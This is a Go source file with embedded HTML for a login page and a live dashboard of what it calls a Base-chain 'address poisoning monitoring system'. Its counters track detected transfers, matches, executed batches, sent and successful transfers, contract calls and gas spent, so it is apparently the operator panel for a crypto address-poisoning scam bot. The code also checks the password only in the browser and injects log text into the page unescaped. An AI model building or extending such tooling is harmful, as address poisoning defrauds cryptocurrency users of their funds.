package web

// loginHTML 登录页面
const loginHTML = `<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔐 系统认证</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #0d1117 0%, #161b22 100%);
            color: #e6edf3;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .login-box {
            background: #21262d;
            border: 1px solid #30363d;
            border-radius: 16px;
            padding: 40px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
        }
        .login-box h1 {
            color: #58a6ff;
            text-align: center;
            margin-bottom: 30px;
            font-size: 1.5em;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #8b949e;
        }
        .form-group input {
            width: 100%;
            padding: 12px 16px;
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 8px;
            color: #e6edf3;
            font-size: 16px;
            transition: border-color 0.2s;
        }
        .form-group input:focus {
            outline: none;
            border-color: #58a6ff;
        }
        .submit-btn {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #238636 0%, #2ea043 100%);
            border: none;
            border-radius: 8px;
            color: white;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(35,134,54,0.4);
        }
        .error-msg {
            color: #f85149;
            text-align: center;
            margin-top: 15px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <h1>🔐 系统认证</h1>
        <form method="POST" onsubmit="return validateForm()">
            <div class="form-group">
                <label for="password">访问密码</label>
                <input type="password" id="password" name="password" placeholder="请输入访问密码" required>
            </div>
            <button type="submit" class="submit-btn">验证身份</button>
            <div class="error-msg" id="errorMsg">密码错误，请重试</div>
        </form>
    </div>
    <script>
        function validateForm() {
            const pwd = document.getElementById('password').value;
            if (!pwd || pwd.length < 10) {
                document.getElementById('errorMsg').style.display = 'block';
                return false;
            }
            return true;
        }
    </script>
</body>
</html>`

const indexHTML = `<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎯 地址投毒监控系统</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: linear-gradient(135deg, #0d1117 0%, #161b22 100%); color: #e6edf3; min-height: 100vh; }
        .container { max-width: 1600px; margin: 0 auto; padding: 20px; }

        /* 头部 */
        .header { text-align: center; padding: 30px 0; border-bottom: 1px solid #30363d; margin-bottom: 30px; }
        .header h1 { font-size: 2.5em; color: #58a6ff; margin-bottom: 10px; text-shadow: 0 0 30px rgba(88,166,255,0.3); }
        .header .time-info { font-size: 1.2em; color: #8b949e; }
        .header .time-info .current-time { color: #3fb950; font-weight: bold; font-size: 1.4em; }

        /* 今日进度卡片 */
        .today-section { background: linear-gradient(135deg, #238636 0%, #2ea043 100%); border-radius: 16px; padding: 25px; margin-bottom: 30px; box-shadow: 0 8px 32px rgba(35,134,54,0.3); }
        .today-section h2 { color: #fff; margin-bottom: 20px; font-size: 1.5em; }
        .today-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 15px; }
        .today-card { background: rgba(255,255,255,0.15); border-radius: 12px; padding: 20px; text-align: center; backdrop-filter: blur(10px); }
        .today-card .value { font-size: 2.2em; font-weight: bold; color: #fff; }
        .today-card .label { color: rgba(255,255,255,0.8); margin-top: 5px; font-size: 0.9em; }

        /* 总计统计 */
        .stats-section { margin-bottom: 30px; }
        .stats-section h2 { color: #58a6ff; margin-bottom: 15px; padding-left: 10px; border-left: 4px solid #58a6ff; }
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 15px; }
        .stat-card { background: #21262d; border: 1px solid #30363d; border-radius: 12px; padding: 20px; text-align: center; transition: all 0.3s ease; }
        .stat-card:hover { transform: translateY(-3px); box-shadow: 0 8px 25px rgba(0,0,0,0.3); border-color: #58a6ff; }
        .stat-card .icon { font-size: 1.5em; margin-bottom: 8px; }
        .stat-card .value { font-size: 1.8em; font-weight: bold; color: #58a6ff; }
        .stat-card .label { color: #8b949e; margin-top: 5px; font-size: 0.85em; }
        .stat-card.success .value { color: #3fb950; }
        .stat-card.warning .value { color: #d29922; }
        .stat-card.error .value { color: #f85149; }

        /* 状态指示器 */
        .status-bar { display: flex; justify-content: center; gap: 30px; margin-bottom: 30px; padding: 15px; background: #21262d; border-radius: 12px; }
        .status-item { display: flex; align-items: center; gap: 8px; }
        .status-dot { width: 12px; height: 12px; border-radius: 50%; animation: pulse 2s infinite; }
        .status-dot.online { background: #3fb950; box-shadow: 0 0 10px #3fb950; }
        .status-dot.processing { background: #d29922; box-shadow: 0 0 10px #d29922; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }

        /* 系统监控 */
        .system-section { margin-bottom: 30px; }
        .system-section h2 { color: #a371f7; margin-bottom: 15px; padding-left: 10px; border-left: 4px solid #a371f7; }
        .system-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; }
        .system-card { background: #21262d; border: 1px solid #30363d; border-radius: 12px; padding: 20px; }
        .system-card .title { color: #8b949e; font-size: 0.9em; margin-bottom: 10px; }
        .system-card .value { font-size: 1.5em; font-weight: bold; color: #a371f7; }
        .system-card .sub { color: #6e7681; font-size: 0.85em; margin-top: 5px; }
        .progress-bar { height: 8px; background: #30363d; border-radius: 4px; margin-top: 10px; overflow: hidden; }
        .progress-bar .fill { height: 100%; border-radius: 4px; transition: width 0.3s; }
        .progress-bar .fill.green { background: linear-gradient(90deg, #238636, #3fb950); }
        .progress-bar .fill.yellow { background: linear-gradient(90deg, #9e6a03, #d29922); }
        .progress-bar .fill.red { background: linear-gradient(90deg, #da3633, #f85149); }

        /* 日志区域 */
        .logs-section { background: #21262d; border: 1px solid #30363d; border-radius: 12px; padding: 20px; }
        .logs-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; flex-wrap: wrap; gap: 10px; }
        .logs-header h2 { color: #58a6ff; }
        .filter-btns { display: flex; gap: 8px; flex-wrap: wrap; }
        .filter-btns button { background: #30363d; border: none; color: #c9d1d9; padding: 8px 16px; border-radius: 8px; cursor: pointer; transition: all 0.2s; font-size: 0.9em; }
        .filter-btns button:hover { background: #484f58; }
        .filter-btns button.active { background: #58a6ff; color: #0d1117; }
        .logs-container { max-height: 400px; overflow-y: auto; font-family: 'SF Mono', Monaco, monospace; font-size: 13px; background: #0d1117; border-radius: 8px; padding: 10px; }
        .log-entry { padding: 10px 12px; border-radius: 6px; margin-bottom: 4px; display: flex; gap: 12px; align-items: flex-start; }
        .log-entry:hover { background: #161b22; }
        .log-time { color: #6e7681; min-width: 70px; font-size: 0.9em; }
        .log-level { min-width: 50px; font-weight: 600; font-size: 0.85em; padding: 2px 6px; border-radius: 4px; text-align: center; }
        .log-level.INFO { color: #58a6ff; background: rgba(88,166,255,0.1); }
        .log-level.WARN { color: #d29922; background: rgba(210,153,34,0.1); }
        .log-level.ERROR { color: #f85149; background: rgba(248,81,73,0.1); }
        .log-category { color: #a371f7; min-width: 70px; font-size: 0.9em; }
        .log-message { flex: 1; color: #e6edf3; }
        .log-details { color: #6e7681; font-size: 0.85em; max-width: 300px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }

        /* 底部 */
        .footer { text-align: center; color: #6e7681; padding: 20px; font-size: 0.9em; }
        .footer .refresh-dot { display: inline-block; width: 8px; height: 8px; background: #3fb950; border-radius: 50%; margin-right: 8px; animation: pulse 1s infinite; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🎯 Base地址投毒监控系统</h1>
            <div class="time-info">
                <span id="currentDate"></span> &nbsp;|&nbsp;
                <span class="current-time" id="currentTime"></span> &nbsp;|&nbsp;
                运行时间: <span id="uptime">--</span>
            </div>
        </div>

        <div class="status-bar">
            <div class="status-item"><div class="status-dot online"></div><span>系统在线</span></div>
            <div class="status-item"><div class="status-dot processing"></div><span>实时监控中</span></div>
        </div>

        <div class="today-section">
            <h2>📅 今日进度</h2>
            <div class="today-grid" id="todayGrid"></div>
        </div>

        <div class="stats-section">
            <h2>📊 累计统计</h2>
            <div class="stats-grid" id="statsGrid"></div>
        </div>

        <div class="system-section">
            <h2>🖥️ 服务器状态</h2>
            <div class="system-grid" id="systemGrid"></div>
        </div>

        <div class="logs-section">
            <div class="logs-header">
                <h2>📋 实时日志</h2>
                <div class="filter-btns">
                    <button class="active" onclick="filterLogs('all')">全部</button>
                    <button onclick="filterLogs('monitor')">监控</button>
                    <button onclick="filterLogs('match')">匹配</button>
                    <button onclick="filterLogs('execute')">执行</button>
                </div>
            </div>
            <div class="logs-container" id="logsContainer"></div>
        </div>

        <div class="footer"><span class="refresh-dot"></span>实时刷新中 · 每2秒自动更新</div>
    </div>
    <script>
        let currentFilter = 'all';

        function updateTime() {
            const now = new Date();
            document.getElementById('currentTime').textContent = now.toLocaleTimeString('zh-CN', {hour12: false});
        }
        setInterval(updateTime, 1000);
        updateTime();

        function updateStats() {
            fetch('api/stats').then(r => r.json()).then(data => {
                document.getElementById('currentDate').textContent = data.current_date;
                document.getElementById('uptime').textContent = data.uptime;

                const todayRate = data.today_sent > 0 ? (data.today_success / data.today_sent * 100).toFixed(1) : '100';
                document.getElementById('todayGrid').innerHTML = ` + "`" + `
                    <div class="today-card"><div class="value">${data.today_detected.toLocaleString()}</div><div class="label">📡 检测转账</div></div>
                    <div class="today-card"><div class="value">${data.today_filtered.toLocaleString()}</div><div class="label">🔍 有效过滤</div></div>
                    <div class="today-card"><div class="value">${data.today_matches}</div><div class="label">🎯 匹配成功</div></div>
                    <div class="today-card"><div class="value">${data.today_batches}</div><div class="label">📦 执行批次</div></div>
                    <div class="today-card"><div class="value">${data.today_sent}</div><div class="label">📤 已发送</div></div>
                    <div class="today-card"><div class="value">${data.today_success}</div><div class="label">✅ 成功</div></div>
                    <div class="today-card"><div class="value">${todayRate}%</div><div class="label">📈 成功率</div></div>
                ` + "`" + `;

                const totalRate = data.transfers_sent > 0 ? (data.transfers_success / data.transfers_sent * 100).toFixed(1) : '100';
                const gasUsedETH = (data.gas_used / 1e18).toFixed(8);
                document.getElementById('statsGrid').innerHTML = ` + "`" + `
                    <div class="stat-card"><div class="icon">📡</div><div class="value">${data.transfers_detected.toLocaleString()}</div><div class="label">检测转账总数</div></div>
                    <div class="stat-card"><div class="icon">🔍</div><div class="value">${data.transfers_filtered.toLocaleString()}</div><div class="label">过滤后总数</div></div>
                    <div class="stat-card success"><div class="icon">🎯</div><div class="value">${data.matches_found}</div><div class="label">匹配成功总数</div></div>
                    <div class="stat-card warning"><div class="icon">⏳</div><div class="value">${data.matches_pending}</div><div class="label">待处理</div></div>
                    <div class="stat-card"><div class="icon">📦</div><div class="value">${data.batches_executed}</div><div class="label">批次执行</div></div>
                    <div class="stat-card"><div class="icon">📤</div><div class="value">${data.transfers_sent}</div><div class="label">发送总数</div></div>
                    <div class="stat-card success"><div class="icon">✅</div><div class="value">${data.transfers_success}</div><div class="label">成功总数</div></div>
                    <div class="stat-card error"><div class="icon">❌</div><div class="value">${data.transfers_failed}</div><div class="label">失败总数</div></div>
                    <div class="stat-card"><div class="icon">📈</div><div class="value">${totalRate}%</div><div class="label">总成功率</div></div>
                    <div class="stat-card"><div class="icon">📝</div><div class="value">${data.contract_calls}</div><div class="label">合约调用</div></div>
                    <div class="stat-card"><div class="icon">⛽</div><div class="value">${gasUsedETH}</div><div class="label">Gas费(ETH)</div></div>
                ` + "`" + `;
            }).catch(console.error);
        }

        function updateLogs() {
            fetch('api/logs?category=' + currentFilter).then(r => r.json()).then(logs => {
                const container = document.getElementById('logsContainer');
                const wasAtBottom = container.scrollHeight - container.scrollTop <= container.clientHeight + 50;
                if (!logs || logs.length === 0) {
                    container.innerHTML = '<div style="text-align:center;color:#6e7681;padding:40px;">暂无日志记录</div>';
                    return;
                }
                container.innerHTML = logs.map(log => ` + "`" + `
                    <div class="log-entry">
                        <span class="log-time">${log.time}</span>
                        <span class="log-level ${log.level}">${log.level}</span>
                        <span class="log-category">${log.category}</span>
                        <span class="log-message">${log.message}</span>
                        ${log.details ? ` + "`" + `<span class="log-details" title="${log.details}">${log.details}</span>` + "`" + ` : ''}
                    </div>
                ` + "`" + `).join('');
                if (wasAtBottom) container.scrollTop = container.scrollHeight;
            }).catch(console.error);
        }

        function filterLogs(category) {
            currentFilter = category;
            document.querySelectorAll('.filter-btns button').forEach(b => b.classList.remove('active'));
            event.target.classList.add('active');
            updateLogs();
        }

        function formatBytes(bytes) {
            if (bytes === 0) return '0 B';
            const k = 1024;
            const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
        }

        function getProgressClass(percent) {
            if (percent < 60) return 'green';
            if (percent < 85) return 'yellow';
            return 'red';
        }

        function updateSystem() {
            fetch('api/system').then(r => r.json()).then(data => {
                const cpuClass = getProgressClass(data.cpu_percent || 0);
                const memClass = getProgressClass(data.mem_percent || 0);
                const diskClass = getProgressClass(data.disk_percent || 0);

                document.getElementById('systemGrid').innerHTML = ` + "`" + `
                    <div class="system-card">
                        <div class="title">🔲 CPU使用率</div>
                        <div class="value">${(data.cpu_percent || 0).toFixed(1)}%</div>
                        <div class="sub">${data.cpu_cores || 0} 核心 · ${data.goroutines || 0} Goroutines</div>
                        <div class="progress-bar"><div class="fill ${cpuClass}" style="width:${data.cpu_percent || 0}%"></div></div>
                    </div>
                    <div class="system-card">
                        <div class="title">💾 内存使用</div>
                        <div class="value">${formatBytes(data.mem_used || 0)}</div>
                        <div class="sub">总计 ${formatBytes(data.mem_total || 0)} · 可用 ${formatBytes(data.mem_available || 0)}</div>
                        <div class="progress-bar"><div class="fill ${memClass}" style="width:${data.mem_percent || 0}%"></div></div>
                    </div>
                    <div class="system-card">
                        <div class="title">📀 磁盘使用</div>
                        <div class="value">${formatBytes(data.disk_used || 0)}</div>
                        <div class="sub">总计 ${formatBytes(data.disk_total || 0)} · 剩余 ${formatBytes(data.disk_free || 0)}</div>
                        <div class="progress-bar"><div class="fill ${diskClass}" style="width:${data.disk_percent || 0}%"></div></div>
                    </div>
                    <div class="system-card">
                        <div class="title">🌐 网络IO</div>
                        <div class="value">↑${formatBytes(data.net_bytes_sent || 0)}</div>
                        <div class="sub">↓${formatBytes(data.net_bytes_recv || 0)} · 包 ${(data.net_packets_sent || 0).toLocaleString()}/${(data.net_packets_recv || 0).toLocaleString()}</div>
                    </div>
                    <div class="system-card">
                        <div class="title">🔧 Go运行时</div>
                        <div class="value">${formatBytes(data.go_heap_alloc || 0)}</div>
                        <div class="sub">堆系统 ${formatBytes(data.go_heap_sys || 0)} · GC ${data.go_gc_num || 0}次</div>
                    </div>
                    <div class="system-card">
                        <div class="title">📍 主机信息</div>
                        <div class="value">PID ${data.pid || 0}</div>
                        <div class="sub">${data.hostname || 'unknown'}</div>
                    </div>
                ` + "`" + `;
            }).catch(console.error);
        }

        updateStats(); updateLogs(); updateSystem();
        setInterval(updateStats, 2000);
        setInterval(updateLogs, 2000);
        setInterval(updateSystem, 3000);
    </script>
</body>
</html>`
